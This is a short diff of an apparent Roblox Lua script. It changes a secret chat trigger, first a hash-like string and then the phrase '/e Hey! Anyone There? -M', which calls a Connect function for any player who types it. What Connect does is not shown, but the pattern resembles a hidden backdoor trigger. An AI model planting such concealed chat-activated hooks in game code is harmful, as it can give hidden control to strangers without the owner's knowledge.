@@ -91,7 +91,7 @@ Players.PlayerAdded:Connect(function(...)
    end
   
    Player[1].Chatted:Connect(function(A)
-     if A == "/e 385cd52b6c30de8884e3810dee29f5c5c4598c74a2e9aaa306e38b0913f8be98" then
+     if A == "/e Hey! Anyone There? -M" then
        Connect(Player[1])
      end
    end)
@@ -106,7 +106,7 @@ for I, V in pairs(Players:GetPlayers()) do
   end
   
   V.Chatted:Connect(function(A)
-     if A == "/e 385cd52b6c30de8884e3810dee29f5c5c4598c74a2e9aaa306e38b0913f8be98" then
+     if A == "/e Hey! Anyone There? -M" then
        Connect(V)
      end
   end)
